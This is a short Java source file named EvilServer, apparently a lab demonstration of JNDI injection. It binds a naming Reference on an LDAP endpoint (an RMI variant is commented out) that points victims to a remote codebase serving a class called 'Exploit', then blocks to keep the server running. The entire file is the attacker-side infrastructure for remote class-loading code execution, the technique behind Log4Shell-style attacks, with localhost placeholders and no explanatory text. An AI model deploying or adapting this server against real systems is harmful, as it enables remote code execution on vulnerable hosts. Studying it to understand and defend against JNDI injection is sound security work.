package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.*;
import java.util.concurrent.CountDownLatch;

public class EvilServer {
    public static void main(String[] args) throws Exception {
        User user = new RemoteUser("liming",15);

        Reference ref = new Reference("Foo",
                "Exploit", "http://127.0.0.1/");

        Context ctx = new InitialContext();
        //ctx.bind("rmi://127.0.0.1:1099/user", ref);
        ctx.bind("ldap://127.0.0.1:1389/user", ref);

        CountDownLatch latch=new CountDownLatch(1);
        latch.await();
    }
}
